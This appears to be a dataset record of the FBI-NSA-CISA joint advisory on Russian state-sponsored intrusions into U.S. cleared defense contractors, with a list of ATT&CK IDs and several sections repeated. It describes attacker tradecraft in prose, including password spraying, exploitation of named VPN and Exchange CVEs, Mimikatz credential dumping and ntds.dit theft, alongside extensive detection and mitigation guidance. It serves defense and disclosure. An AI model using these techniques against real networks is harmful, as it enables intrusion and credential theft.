Threat actors logged into a victim’s VPN server and connected to the domain controllers, from which they exfiltrated credentials and exported copies of the AD database ntds.dit.



Initial Access [TA0001]
Privilege Escalation [TA0004]
Collection [TA0009]


Valid Accounts: Cloud Accounts [T1078.004]
Data from Information Repositories: SharePoint [T1213.002]

In one case, the actors used valid credentials of a global admin account within the M365 tenant to log into the administrative portal and change permissions of an existing enterprise application to give read access to all SharePoint pages in the environment, as well as tenant user profiles and email inboxes.



Initial Access [TA0001]
Collection [TA0009]


Valid Accounts: Domain Accounts [T1078.002]
Email Collection [T1114]

In one case, the threat actors used legitimate credentials to exfiltrate emails from the victim's enterprise email system.



Persistence [TA0003]
Lateral Movement [TA0008]

Valid Accounts [T1078]
Threat actors used valid accounts for persistence. After some victims reset passwords for individually compromised accounts, the actors pivoted to other accounts, as needed, to maintain access.


Discovery [TA0007]
File and Network Discovery [T1083]
After gaining access to networks, the threat actors used BloodHound to map the Active Directory. 


Discovery [TA0007]
Domain Trust Discovery [T1482]
Threat actors gathered information on domain trust relationships that were used to identify lateral movement opportunities.


Command and Control [TA0011]
Proxy: Multi-hop Proxy [T1090.003]
Threat actors used multiple disparate nodes, such as VPSs, to route traffic to the target.



 
Detection
The FBI, NSA, and CISA urge all CDCs to investigate suspicious activity in their enterprise and cloud environments. Note: for additional approaches on uncovering malicious cyber activity, see joint advisory Technical Approaches to Uncovering and Remediating Malicious Activity, authored by CISA and the cybersecurity authorities of Australia, Canada, New Zealand, and the United Kingdom.
Detect Unusual Activity
Implement robust log collection and retention. Robust logging is critical for detecting unusual activity. Without a centralized log collection and monitoring capability, organizations have limited ability to investigate incidents or detect the threat actor behavior described in this advisory. Depending on the environment, tools and solutions include:

Cloud native solutions, such as cloud-native security incident and event management (SIEM) tools.
Third-party tools, such as Sparrow, to review Microsoft cloud environments and to detect unusual activity, service principals, and application activity. Note: for guidance on using these and other detection tools, refer to CISA Cybersecurity Advisory Detecting Post-Compromise Threat Activity in Microsoft Cloud Environments.

Look for Evidence of Known TTPs

Look for behavioral evidence or network and host-based artifacts from known TTPs associated with this activity. To detect password spray activity, review authentication logs for system and application login failures of valid accounts. Look for frequent, failed authentication attempts across multiple accounts. 
To detect use of compromised credentials in combination with a VPS, follow the steps below:

Review logs for suspicious “impossible logins,” such as logins with changing usernames, user agent strings, and IP address combinations or logins where IP addresses do not align to the expected user’s geographic location.
Look for one IP used for multiple accounts, excluding expected logins.
Search for “impossible travel,” which occurs when a user logs in from multiple IP addresses that are a significant geographic distance apart (i.e., a person could not realistically travel between the geographic locations of the two IP addresses in the time between logins). Note: this detection opportunity can result in false positives if legitimate users apply VPN solutions before connecting to networks.
Evaluate processes and program execution command-line arguments that may indicate credential dumping, especially attempts to access or copy the ntds.dit file from a domain controller. 
Identify suspicious privileged account use after resetting passwords or applying user account mitigations. 
Review logs for unusual activity in typically dormant accounts.
Look for unusual user agent strings, such as strings not typically associated with normal user activity, which may indicate bot activity.



Incident Response and Remediation
Organizations with evidence of compromise should assume full identity compromise and initiate a full identity reset.

Reset passwords for all local accounts. These accounts should include Guest, HelpAssistant, DefaultAccount, System, Administrator, and krbtgt. It is essential to reset the password for the krbtgt account, as this account is responsible for handling Kerberos ticket requests as well as encrypting and signing them. Note: reset the krbtgt account twice and consecutively with a 10-hour waiting period between resets (i.e., perform the first krbtgt password reset, wait 10 hours, and then follow with a second krbtgt password reset). The krbtgt password resets may take a long time to propagate fully on large AD environments. Refer to Microsoft’s AD Forest Recovery - Resetting the krbtgt password guidance and automation script for additional information. [4][5]
Reset all domain user, admin, and service account passwords. 

Note: for guidance on evicting advanced persistent threat (APT) actors from cloud and enterprise environments, refer to CISA Analysis Report Eviction Guidance for Networks Affected by the SolarWinds and Active Directory/Microsoft 365 (M365) Compromise. Although this guidance was drafted for federal agencies compromised by the Russian Foreign Intelligence Service (SVR) via the SolarWinds Orion supply chain compromise, the steps provided in the Eviction Phase are applicable for all organizations crafting eviction plans for suspected APT actors.

Mitigations

The FBI, NSA, and CISA encourage all CDCs, with or without evidence of compromise, to apply the following mitigations to reduce the risk of compromise by this threat actor. While these mitigations are not intended to be all-encompassing, they address common TTPs observed in these intrusions and will help to mitigate against common malicious activity. 
Implement Credential Hardening
Enable Multifactor Authentication

Enable multifactor authentication (MFA) for all users, without exception. Subsequent authentication may not require MFA, enabling the possibility to bypass MFA by reusing single factor authentication assertions (e.g., Kerberos authentication). Reducing the lifetime of assertions will cause account re-validation of their MFA requirements.[6] Service accounts should not use MFA. Automation and platform features (e.g., Group Managed Service Accounts, gMSA) can provide automatic and periodic complex password management for service accounts, reducing the threat surface against single factor authentication assertions.[7] 

Enforce Strong, Unique Passwords

Require accounts to have strong, unique passwords. Passwords should not be reused across multiple accounts or stored on the system where an adversary may have access.
Enable password management functions, such as Local Administrator Password Solution (LAPS), for local administrative accounts. This will reduce the burden of users managing passwords and encourage them to have strong passwords.

Introduce Account Lockout and Time-Based Access Features

Implement time-out and lock-out features in response to repeated failed login attempts.
Configure time-based access for accounts set at the admin level and higher. For example, the Just-In-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable administrator accounts at the AD level when the account is not in direct need. When the account is needed, individual users submit their requests through an automated process that enables access to a system but only for a set timeframe to support task completion.

Reduce Credential Exposure

Use virtualization solutions on modern hardware and software to ensure credentials are securely stored, and protect credentials via capabilities, such as Windows Defender Credential Guard (CredGuard) and Trusted Platform Module (TPM).[8] Protecting domain credentials with CredGuard requires configuration and has limitations in protecting other types of credentials (e.g., WDigest and local accounts).[9][10] CredGuard uses TPMs to protect stored credentials. TPMs function as a system integrity observer and trust anchor ensuring the integrity of the boot sequence and mechanisms (e.g., UEFI Secure Boot). Installation of Windows 11 requires TPM v2.0.[11] Disabling WDigest and rolling expiring NTLM secrets in smartcards will further protect other credentials not protected by CredGuard.[12][13]

Establish Centralized Log Management

Create a centralized log management system. Centralized logging applications allow network defenders to look for anomalous activity, such as out-of-place communications between devices or unaccountable login failures, in the network environment. 

Forward all logs to a SIEM tool.
Ensure logs are searchable.
Retain critical and historic network activity logs for a minimum of 180 days. 


If using M365, enable Unified Audit Log (UAL)—M365’s logging capability—which contains events from Exchange Online, SharePoint online, OneDrive, Azure AD, Microsoft Teams, PowerBI, and other M365 services. 
Correlate logs, including M365 logs, from network and host security devices. This correlation will help with detecting anomalous activity in the network environment and connecting it with potential anomalous activity in M365. 

In addition to setting up centralized logging, organizations should:

Ensure PowerShell logging is turned on. Threat actors often use PowerShell to hide their malicious activities.[14] 
Update PowerShell instances to version 5.0 or later and uninstall all earlier versions of PowerShell. Logs from prior versions are either non-existent or do not record enough detail to aid in enterprise monitoring and incident response activities. 
Confirm PowerShell 5.0 instances have module, script block, and transcription logging enabled.
Monitor remote access/Remote Desktop Protocol (RDP) logs and disable unused remote access/RDP ports.

Initiate a Software and Patch Management Program 

Consider using a centralized patch management system. Failure to deploy software patches in a timely manner makes an organization a target of opportunity, increasing its risk of compromise. Organizations can ensure timely patching of software vulnerabilities by implementing an enterprise-wide software and patch management program.[15] 

If an organization is unable to update all software shortly after a patch is released, prioritize patches for CVEs that are already known to be exploited or that would be accessible to the largest number of potential adversaries (such as internet-facing systems). 
Subscribe to CISA cybersecurity notifications and advisories to keep up with known exploited vulnerabilities, security updates, and threats. This will assist organizations in maintaining situational awareness of critical software vulnerabilities and, if applicable, associated exploitation. 


Sign up for CISA’s cyber hygiene services, including vulnerability scanning, to help reduce exposure to threats. CISA’s vulnerability scanning service evaluates external network presence by executing continuous scans of public, static IPs for accessible services and vulnerabilities.

Employ Antivirus Programs 

Ensure that antivirus applications are installed on all organizations’ computers and are configured to prevent spyware, adware, and malware as part of the operating system security baseline. 
Keep virus definitions up to date.
Regularly monitor antivirus scans. 

Use Endpoint Detection and Response Tools 

Utilize endpoint detection and response (EDR) tools. These tools allow a high degree of visibility into the security status of endpoints and can be an effective defense against threat actors. EDR tools are particularly useful for detecting lateral movement, as they have insight into common and uncommon network connections for each host. 

Maintain Rigorous Configuration Management Programs 

Audit configuration management programs to ensure they can track and mitigate emerging threats. Review system configurations for misconfigurations and security weaknesses. Having a robust configuration program hinders sophisticated threat operations by limiting the effectiveness of opportunistic attacks.[16] 

Enforce the Principle of Least Privilege

Apply the principle of least privilege. Administrator accounts should have the minimum permissions they need to do their tasks. This can reduce the impact if an administrator account is compromised.  
For M365, assign administrator roles to role-based access control (RBAC) to implement the principle of least privilege. Given its high level of default privilege, you should only use the Global Administrator account when absolutely necessary. Using Azure AD’s numerous other built-in administrator roles instead of the Global Administrator account can limit assigning unnecessary privileges. Note: refer to the Microsoft documentation, Azure AD built-in roles, for more information about Azure AD. 
Remove privileges not expressly required by an account’s function or role. 
Ensure there are unique and distinct administrative accounts for each set of administrative tasks. 
Create non-privileged accounts for privileged users, and ensure they use the non- privileged accounts for all non-privileged access (e.g., web browsing, email access).
Reduce the number of domain and enterprise administrator accounts, and remove all accounts that are unnecessary.
Regularly audit administrative user accounts.
Regularly audit logs to ensure new accounts are legitimate users.
Institute a group policy that disables remote interactive logins, and use Domain Protected Users Group.

To assist with identifying suspicious behavior with administrative accounts:

Create privileged role tracking.
Create a change control process for all privilege escalations and role changes on user accounts.
Enable alerts on privilege escalations and role changes.
Log privileged user changes in the network environment, and create an alert for unusual events.

Review Trust Relationships

Review existing trust relationships with IT service providers, such as managed service providers (MSPs) and cloud service providers (CSPs). Threat actors are known to exploit trust relationships between providers and their customers to gain access to customer networks and data.  
Remove unnecessary trust relationships.  
Review contractual relationships with all service providers, and ensure contracts include: 

Security controls the customer deems appropriate. 
Appropriate monitoring and logging of provider-managed customer systems.
Appropriate monitoring of the service provider’s presence, activities, and connections to the customer network.
Notification of confirmed or suspected security events and incidents occurring on the provider’s infrastructure and administrative networks.



Note: review CISA’s page on APTs Targeting IT Service Provider Customers and CISA Insights: Mitigations and Hardening Guidance for MSPs and Small and Mid-sized Businesses for additional recommendations for MSP and CSP customers.
Encourage Remote Work Environment Best Practices
With the increase in remote work and use of VPN services due to COVID-19, the FBI, NSA, and CISA encourage regularly monitoring remote network traffic, along with employing the following best practices. Note: for additional information, see joint NSA-CISA Cybersecurity Information Sheet: Selecting and Hardening Remote Access VPN Solutions.

Regularly update VPNs, network infrastructure devices, and devices used for remote work environments with the latest software patches and security configurations.
When possible, require MFA on all VPN connections. Physical security tokens are the most secure form of MFA, followed by authenticator applications. When MFA is unavailable, mandate that employees engaging in remote work use strong passwords.
Monitor network traffic for unapproved and unexpected protocols.
Reduce potential attack surfaces by discontinuing unused VPN servers that may be used as a point of entry by adversaries.

Establish User Awareness Best Practices
Cyber actors frequently use unsophisticated methods to gain initial access, which can often be mitigated by stronger employee awareness of indicators of malicious activity. The FBI, NSA, and CISA recommend the following best practices to improve employee operational security when conducting business:

Provide end user awareness and training. To help prevent targeted social engineering and spearphishing scams, ensure that employees and stakeholders are aware of potential cyber threats and how they are delivered. Also, provide users with training on information security principles and techniques.
Inform employees of the risks of social engineering attacks, e.g., risks associated with posting detailed career information to social or professional networking sites.
Ensure that employees are aware of what to do and whom to contact when they see suspicious activity or suspect a cyber intrusion to help quickly and efficiently identify threats and employ mitigation strategies.

Apply Additional Best Practice Mitigations

Deny atypical inbound activity from known anonymization services, including commercial VPN services and The Onion Router (TOR).
Impose listing policies for applications and remote access that only allow systems to execute known and permitted programs under an established security policy.
Identify and create offline backups for critical assets.
Implement network segmentation.
Review CISA Alert AA20-120A: Microsoft Office 365 Security Recommendations for additional recommendations on hardening M365 cloud environments.

Rewards for Justice Program
If you have information on state-sponsored Russian cyber operations targeting U.S. critical infrastructure, contact the Department of State’s Rewards for Justice Program. You may be eligible for a reward of up to $10 million, which the Department is offering for information leading to the identification or location of any person who, while acting under the direction or control of a foreign government, participates in malicious cyber activity against U.S. critical infrastructure in violation of the Computer Fraud and Abuse Act (CFAA). Contact (202) 702-7843 on WhatsApp, Signal, or Telegram, or send information via the Rewards for Justice secure Tor-based tips line located on the Dark Web. For more details, refer to rewardsforjustice.net.
Caveats
The information you have accessed or received is being provided “as is” for informational purposes only. The FBI, NSA, and CISA do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply their endorsement, recommendation, or favoring by the FBI, NSA, or CISA. 

Contact Information

To report suspicious activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field-offices or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by email at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. To request incident response resources or technical assistance related to these threats, contact CISA at Central@cisa.gov. For NSA client requirements or general cybersecurity inquiries, contact the NSA Cybersecurity Requirements Center at (410) 854-4200 or Cybersecurity_Requests@nsa.gov. Defense Industrial Base companies may additionally sign up for NSA’s free cybersecurity services, including Protective DNS, vulnerability scanning, and threat intelligence collaboration at dib_defense@cyber.nsa.gov. 
Appendix: Detailed Tactics, Techniques, and Procedures
Reconnaissance [TA0043]
Reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. The adversary is known for harvesting login credentials  [T1589.001].[17]
 



ID
Name
Description




T1589.001
Gather Victim Identity Information: Credentials
Adversaries may gather credentials that can be used during targeting.



 
Initial Access [TA0001]
Initial Access consists of techniques that use various entry vectors to gain their initial foothold within a network. For example, the adversary may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion [T1078].[18] These specific actors obtained and abused credentials of domain [T1078.002] and cloud accounts [T1078.004].[19] The actors also used external remote services to gain access to systems [T1133].[20] The adversary took advantage of weaknesses in internet-facing servers and conducted SQL injection attacks against organizations' external websites [T1190].[21] Finally, they sent spearphishing emails with a malicious link in an attempt to gain access [T1566.002].[22] 
 
 



ID
Name
Description




T1078
Valid Accounts 
Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access.


T1078.002
Valid Accounts: Domain Accounts
Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.


T1078.004
Valid Accounts: Cloud Accounts
Adversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.


T1133
External Remote Services
Adversaries may leverage external-facing remote services to initially access and/or persist within a network.


T1190
Exploit Public-Facing Application
Adversaries may attempt to take advantage of a weakness in an internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior.


T1566.002
Phishing: Spearphishing Link
Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. 



 
Persistence [TA0003]
Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. The adversary obtains and abuses credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion [T1078].[23] 
 



ID
Name 
Description




T1078
Valid Accounts
Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.



Privilege Escalation [TA0004]
Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. The adversary obtains and abuses credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion [T1078].[24]  Specifically in this case, credentials of cloud accounts [T1078.004] were obtained and abused.[25]   
 



ID
Name
Description




T1078
Valid Accounts
Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access.


T1078.004
Valid Accounts: Cloud Accounts
Adversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.



Defense Evasion [TA0005]
Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. The adversary made its executables and files difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit [T1027].[26] 
 



ID
Name
Description




T1027
Obfuscated Files or Information
Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.



 
Credential Access [TA0006]
Credential Access consists of techniques for stealing credentials like account names and passwords. The adversary attempted to access or create a copy of the Active Directory (AD) domain database to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights [T1003.003].[27] The adversary also used a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials [T1110.003].[28] 



ID
Name
Description




T1003.003
OS Credential Dumping: NTDS
Adversaries may attempt to access or create a copy of the Active Directory domain database to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. 


T1110.003
Brute Force: Password Spraying
Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. 



Discovery [TA0007]
Discovery consists of techniques an adversary may use to gain knowledge about the system and internal network. The adversary enumerated files and directories or searched in specific locations of a host or network share for certain information within a file system [T1083].[29]  In addition, the adversary attempted to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain or forest environments [T1482].[30] 



ID
Name
Description




T1083
File and Directory Discovery
Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. 


T1482
Domain Trust Discovery
Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments.



 
Collection [TA0009]
Collection consists of both the techniques adversaries may use to gather information and the sources that information is collected from that are relevant to the adversary's objectives. The adversary leverages information repositories, such as SharePoint, to mine valuable information [T1213.002].[31]   



ID
Name
Description




T1213.002
Data from Information Repositories: SharePoint
Adversaries may leverage the SharePoint repository as a source to mine valuable information. 



 
Command and Control [TA0011]
Command and Control (C2) consists of techniques that adversaries may use to communicate with systems under their control within a victim network. The adversary chained together multiple proxies to disguise the source of malicious traffic. In this case, TOR and VPN servers are used as multi-hop proxies to route C2 traffic and obfuscate their activities [T1090.003].[32] 
 



ID
Name
Description




T1090.003
Proxy: Multi-hop Proxy
To disguise the source of malicious traffic, adversaries may chain together multiple proxies. 



 
Additional Resources
[1] NSA, CISA, FBI, NCSC Cybersecurity Advisory: Russian GRU Conducting Global Brute Force Campaign to Compromise Enterprise and Cloud Environments, 1 July 2021.
[2] NSA Cybersecurity Advisory: Mitigating Recent VPN Vulnerabilities, 7 October 2019.
[3] NSA, CISA, FBI, NCSC Cybersecurity Advisory: Russian GRU Conducting Global Brute Force Campaign to Compromise Enterprise and Cloud Environments, 1 July 2021.
[4] Microsoft Article: AD Forest Recovery – Resetting the krbtgt password, 29 July 2021. 
[5] Microsoft GitHub: New-KrbtgtKeys.ps1, 14 May 2020.
[6] NSA Cybersecurity Information: Defend Privileges and Accounts, August 2019.
[7] Microsoft Article: Group Managed Service Accounts Overview, 29 July 2021.
[8] NSA Cybersecurity Information: Leverage Modern Hardware Security Features, August 2019.
[9] Microsoft Article: Protect derived domain credentials with Windows Defender Credential Guard, 3 December 2021.
[10] Microsoft Article: Windows Defender Credential Guard protection limits, 3 December 2021.
[11] Microsoft Article: Windows 11 requirements, 30 November 2021.
[12] Microsoft Blog Post: The Importance of KB2871997 and KB2928120 for Credential Protection, 20 September 2021.
[13] Microsoft Article: What’s New in Credential Protection, 7 January 2022.
[14] NSA Cybersecurity Factsheet: PowerShell: Security Risks and Defenses, 1 December 2016.
[15] NSA Cybersecurity Information: Update and Upgrade Software Immediately, August 2019.
[16] NSA Cybersecurity Information: Actively Manage Systems and Configurations, August 2019.
[17] MITRE Groups: APT28, 18 October 2021.
[18] MITRE Groups: APT28, 18 October 2021.
[19] MITRE Software: Cobalt Strike, 18 October 2021.
[20] Based on technical information shared by Mandiant.
[21] MITRE Groups: APT28, 18 October 2021.
[22] Based on technical information shared by Mandiant.
[23] MITRE Groups: APT28, 18 October 2021.
[24] MITRE Groups: APT28, 18 October 2021.
[25] MITRE Software: Cobalt Strike, 18 October 2021.
[26] MITRE Software: Fysbis, 6 November 2020. 
[27] MITRE Software: Koadic, 30 March 2020. 
[28] MITRE Groups: APT28, 18 October 2021.
[29] Based on technical information shared by Mandiant.
[30] Based on technical information shared by Mandiant.
[31] MITRE Groups: APT28, 18 October 2021.
[32] MITRE Groups: APT28, 18 October 2021.

Revisions

February 16, 2022: Initial Version






This product is provided subject to this Notification and this Privacy & Use policy.


","{'TA0003', 'TA0008', 'T1083', 'T1566.002', 'T1078.004', 'TA0005', 'T1213.002', 'T1482', 'TA0006', 'T1190', 'T1110', 'TA0043', 'TA0011', 'T1110.003', 'T1078.002', 'T1027', 'T1078', 'T1114', 'TA0001', 'T1133', 'TA0009', 'T1003.003', 'TA0004', 'TA0007', 'T1114.002', 'T1090.003', 'T1589.001'}","




Summary

Actions to Help Protect Against Russian State-Sponsored Malicious Cyber Activity:
• Enforce multifactor authentication.
• Enforce strong, unique passwords.
• Enable M365 Unified Audit Logs.
• Implement endpoint detection and response tools.
From at least January 2020, through February 2022, the Federal Bureau of Investigation (FBI), National Security Agency (NSA), and Cybersecurity and Infrastructure Security Agency (CISA) have observed regular targeting of U.S. cleared defense contractors (CDCs) by Russian state-sponsored cyber actors. The actors have targeted both large and small CDCs and subcontractors with varying levels of cybersecurity protocols and resources. These CDCs support contracts for the U.S. Department of Defense (DoD) and Intelligence Community in the following areas:

Command, control, communications, and combat systems;
Intelligence, surveillance, reconnaissance, and targeting;
Weapons and missile development;
Vehicle and aircraft design; and
Software development, data analytics, computers, and logistics. 

Historically, Russian state-sponsored cyber actors have used common but effective tactics to gain access to target networks, including spearphishing, credential harvesting, brute force/password spray techniques, and known vulnerability exploitation against accounts and networks with weak security. These actors take advantage of simple passwords, unpatched systems, and unsuspecting employees to gain initial access before moving laterally through the network to establish persistence and exfiltrate data. 
In many attempted compromises, these actors have employed similar tactics to gain access to enterprise and cloud networks, prioritizing their efforts against the widely used Microsoft 365 (M365) environment. The actors often maintain persistence by using legitimate credentials and a variety of malware when exfiltrating emails and data.
These continued intrusions have enabled the actors to acquire sensitive, unclassified information, as well as CDC-proprietary and export-controlled technology. The acquired information provides significant insight into U.S. weapons platforms development and deployment timelines, vehicle specifications, and plans for communications infrastructure and information technology. By acquiring proprietary internal documents and email communications, adversaries may be able to adjust their own military plans and priorities, hasten technological development efforts, inform foreign policymakers of U.S. intentions, and target potential sources for recruitment. Given the sensitivity of information widely available on unclassified CDC networks, the FBI, NSA, and CISA anticipate that Russian state-sponsored cyber actors will continue to target CDCs for U.S. defense information in the near future. These agencies encourage all CDCs to apply the recommended mitigations in this advisory, regardless of evidence of compromise.
For additional information on Russian state-sponsored cyber activity, see CISA's webpage, Russia Cyber Threat Overview and Advisories.
Click here for a PDF version of this report.
Threat Details
Targeted Industries and Assessed Motive
Russian state-sponsored cyber actors have targeted U.S. CDCs from at least January 2020, through February 2022. The actors leverage access to CDC networks to obtain sensitive data about U.S. defense and intelligence programs and capabilities. Compromised entities have included CDCs supporting the U.S. Army, U.S. Air Force, U.S. Navy, U.S. Space Force, and DoD and Intelligence programs.
During this two-year period, these actors have maintained persistent access to multiple CDC networks, in some cases for at least six months. In instances when the actors have successfully obtained access, the FBI, NSA, and CISA have noted regular and recurring exfiltration of emails and data. For example, during a compromise in 2021, threat actors exfiltrated hundreds of documents related to the company’s products, relationships with other countries, and internal personnel and legal matters.
Through these intrusions, the threat actors have acquired unclassified CDC-proprietary and export-controlled information. This theft has granted the actors significant insight into U.S. weapons platforms development and deployment timelines, plans for communications infrastructure, and specific technologies employed by the U.S. government and military. Although many contract awards and descriptions are publicly accessible, program developments and internal company communications remain sensitive. Unclassified emails among employees or with government customers often contain proprietary details about technological and scientific research, in addition to program updates and funding statuses. See figures 1 and 2 for information on targeted customers, industries, and information.
 

Figure 1. Targeted Industries
 

Figure 2. Exfiltrated Information
 
Threat Actor Activity
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 10. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques. See the Tactics, Techniques, and Procedures (TTPs) section for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques.
Initial Access 
Russian state-sponsored cyber actors use brute force methods, spearphishing, harvested credentials, and known vulnerabilities to gain initial access to CDC networks.

Threat actors use brute force techniques, to identify valid account credentials, for domain and M365 accounts. After obtaining domain credentials, the actors use them to gain initial access to the networks. Note: For more information, see joint NSA-FBI-CISA Cybersecurity Advisory: Russian GRU Conducting Global Brute Force Campaign to Compromise Enterprise and Cloud Environments.
Threat actors send spearphishing emails with links to malicious domains, and use publicly available URL shortening services to mask the link,. Embedding shortened URLs instead of actor-controlled malicious domains is an obfuscation technique meant to bypass virus and spam scanning tools. The technique often promotes a false legitimacy to the email recipient, increasing the probability of a victim’s clicking on the link. 
The threat actors use harvested credentials in conjunction with known vulnerabilities—for example, CVE-2020-0688 and CVE-2020-17144—on public-facing applications, such as virtual private networks (VPNs), to escalate privileges and gain remote code execution (RCE) on the exposed applications.,1, In addition, threat actors have exploited CVE-2018-13379 on FortiClient to obtain credentials to access networks. 
As CDCs find and patch known vulnerabilities on their networks, the actors alter their tradecraft to seek new means of access. This activity necessitates CDCs maintain constant vigilance for software vulnerabilities and out-of-date security configurations, especially in internet-facing systems.

Credential Access 
After gaining access to networks, the threat actors map the Active Directory (AD) and connect to domain controllers, from which they exfiltrate credentials and export copies of the AD database ntds.dit,. In multiple instances, the threat actors have used Mimikatz to dump admin credentials from the domain controllers. 
Collection
Using compromised M365 credentials, including global admin accounts, the threat actors can gain access to M365 resources, including SharePoint pages, user profiles, and user emails,.
Command and Control
The threat actors routinely use virtual private servers (VPSs) as an encrypted proxy. The actors use VPSs, as well as small office and home office (SOHO) devices, as operational nodes to evade detection,.
Persistence
In multiple instances, the threat actors maintained persistent access for at least six months. Although the actors have used a variety of malware to maintain persistence, the FBI, NSA, and CISA have also observed intrusions that did not rely on malware or other persistence mechanisms. In these cases, it is likely the threat actors relied on possession of legitimate credentials for persistence, enabling them to pivot to other accounts, as needed, to maintain access to the compromised environments.
Tactics, Techniques, and Procedures
The following table maps observed Russian state-sponsored cyber activity to the MITRE ATT&CK for Enterprise framework. Several of the techniques listed in the table are based on observed procedures in contextual order. Therefore, some of the tactics and techniques listed in their respective columns appear more than once. See Appendix A for a functional breakdown of TTPs. Note: for specific countermeasures related to each ATT&CK technique, see the Enterprise Mitigations section and MITRE D3FEND™.
 
Table 1: Observed Tactics, Techniques, and Procedures (TTPs)

 
Detection
The FBI, NSA, and CISA urge all CDCs to investigate suspicious activity in their enterprise and cloud environments. Note: for additional approaches on uncovering malicious cyber activity, see joint advisory Technical Approaches to Uncovering and Remediating Malicious Activity, authored by CISA and the cybersecurity authorities of Australia, Canada, New Zealand, and the United Kingdom.
Detect Unusual Activity
Implement robust log collection and retention. Robust logging is critical for detecting unusual activity. Without a centralized log collection and monitoring capability, organizations have limited ability to investigate incidents or detect the threat actor behavior described in this advisory. Depending on the environment, tools and solutions include:

Cloud native solutions, such as cloud-native security incident and event management (SIEM) tools.
Third-party tools, such as Sparrow, to review Microsoft cloud environments and to detect unusual activity, service principals, and application activity. Note: for guidance on using these and other detection tools, refer to CISA Cybersecurity Advisory Detecting Post-Compromise Threat Activity in Microsoft Cloud Environments.

Look for Evidence of Known TTPs

Look for behavioral evidence or network and host-based artifacts from known TTPs associated with this activity. To detect password spray activity, review authentication logs for system and application login failures of valid accounts. Look for frequent, failed authentication attempts across multiple accounts. 
To detect use of compromised credentials in combination with a VPS, follow the steps below:

Review logs for suspicious “impossible logins,” such as logins with changing usernames, user agent strings, and IP address combinations or logins where IP addresses do not align to the expected user’s geographic location.
Look for one IP used for multiple accounts, excluding expected logins.
Search for “impossible travel,” which occurs when a user logs in from multiple IP addresses that are a significant geographic distance apart (i.e., a person could not realistically travel between the geographic locations of the two IP addresses in the time between logins). Note: this detection opportunity can result in false positives if legitimate users apply VPN solutions before connecting to networks.
Evaluate processes and program execution command-line arguments that may indicate credential dumping, especially attempts to access or copy the ntds.dit file from a domain controller. 
Identify suspicious privileged account use after resetting passwords or applying user account mitigations. 
Review logs for unusual activity in typically dormant accounts.
Look for unusual user agent strings, such as strings not typically associated with normal user activity, which may indicate bot activity.



Incident Response and Remediation
Organizations with evidence of compromise should assume full identity compromise and initiate a full identity reset.

Reset passwords for all local accounts. These accounts should include Guest, HelpAssistant, DefaultAccount, System, Administrator, and krbtgt. It is essential to reset the password for the krbtgt account, as this account is responsible for handling Kerberos ticket requests as well as encrypting and signing them. Note: reset the krbtgt account twice and consecutively with a 10-hour waiting period between resets (i.e., perform the first krbtgt password reset, wait 10 hours, and then follow with a second krbtgt password reset). The krbtgt password resets may take a long time to propagate fully on large AD environments. Refer to Microsoft’s AD Forest Recovery - Resetting the krbtgt password guidance and automation script for additional information.,4,5,
Reset all domain user, admin, and service account passwords. 

Note: for guidance on evicting advanced persistent threat (APT) actors from cloud and enterprise environments, refer to CISA Analysis Report Eviction Guidance for Networks Affected by the SolarWinds and Active Directory/Microsoft 365 (M365) Compromise. Although this guidance was drafted for federal agencies compromised by the Russian Foreign Intelligence Service (SVR) via the SolarWinds Orion supply chain compromise, the steps provided in the Eviction Phase are applicable for all organizations crafting eviction plans for suspected APT actors.

Mitigations

The FBI, NSA, and CISA encourage all CDCs, with or without evidence of compromise, to apply the following mitigations to reduce the risk of compromise by this threat actor. While these mitigations are not intended to be all-encompassing, they address common TTPs observed in these intrusions and will help to mitigate against common malicious activity. 
Implement Credential Hardening
Enable Multifactor Authentication

Enable multifactor authentication (MFA) for all users, without exception. Subsequent authentication may not require MFA, enabling the possibility to bypass MFA by reusing single factor authentication assertions (e.g., Kerberos authentication). Reducing the lifetime of assertions will cause account re-validation of their MFA requirements.,6, Service accounts should not use MFA. Automation and platform features (e.g., Group Managed Service Accounts, gMSA) can provide automatic and periodic complex password management for service accounts, reducing the threat surface against single factor authentication assertions.,7, 

